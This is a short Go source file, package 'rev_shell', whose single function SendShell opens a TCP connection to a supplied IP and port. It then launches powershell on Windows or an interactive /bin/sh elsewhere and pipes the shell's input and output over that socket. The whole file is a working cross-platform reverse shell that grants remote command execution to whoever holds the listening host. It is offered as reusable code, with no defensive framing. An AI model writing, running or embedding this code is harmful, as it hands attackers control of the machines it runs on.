package rev_shell

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
)

func SendShell(ip string, port int) {

	target := fmt.Sprintf("%s:%d", ip, port)
	con, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}
